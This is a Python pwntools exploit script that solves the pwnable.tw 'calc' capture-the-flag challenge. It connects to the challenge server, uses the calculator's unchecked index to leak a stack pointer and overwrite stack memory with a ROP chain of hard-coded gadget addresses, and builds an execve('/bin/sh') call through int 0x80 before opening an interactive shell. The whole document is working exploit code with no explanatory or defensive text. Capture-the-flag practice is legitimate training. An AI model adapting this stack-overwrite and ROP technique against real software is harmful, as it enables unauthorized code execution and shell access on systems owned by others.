from pwn import *

# r = process('./calc', shell=False)
r = remote('chall.pwnable.tw', 10100)

def read_from_mem(offset):
    # read original
    r.sendline(b'+' + str(offset).encode('utf-8'))
    res = r.recv(100).decode()
    return int(res)

# exploit to write to memory
def write_to_mem(offset, content):
    # read original
    r.sendline(b'+' + str(offset).encode('utf-8'))
    res = r.recv(100).decode()
    # print(f"org {offset}:", res[:-1])

    # write new value (relative)
    delta = content - int(res)
    if(delta >= 0):
        r.sendline(b'+' + str(offset).encode('utf-8') + b'+' + str(delta).encode('utf-8'))
    else:
        r.sendline(b'+' + str(offset).encode('utf-8') + b'-' + str(-1 * delta).encode('utf-8'))
    res = r.recv(100).decode()
    # print(f"new {offset}:", res[:-1])


if __name__ == '__main__':
    r.recvuntil(b'=== Welcome to SECPROG calculator ===\n')
    # current $esp = old $ebp (360) - 28
    old_ebp = read_from_mem(360)
    current_esp = old_ebp - 28

    # write return addr with 'pop eax; ret'
    write_to_mem(361, 0x0805c34b)
    write_to_mem(362, 0x0000000b)
    write_to_mem(363, 0x080701d0)
    
    # 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
    write_to_mem(364, current_esp + 8*4) # nullptr
    write_to_mem(365, current_esp + 7*4) # ptr
    write_to_mem(366, current_esp + 9*4) # pathname
    write_to_mem(367, 0x08049a21) # int 0x80
    
    # parameters
    write_to_mem(368, current_esp + 9*4) # ptr to pathname
    write_to_mem(369, 0x00000000)
    write_to_mem(370, 0x6e69622f) # /bin
    write_to_mem(371, 0x0068732f) # /sh
    write_to_mem(372, 0x00000000)

    r.interactive()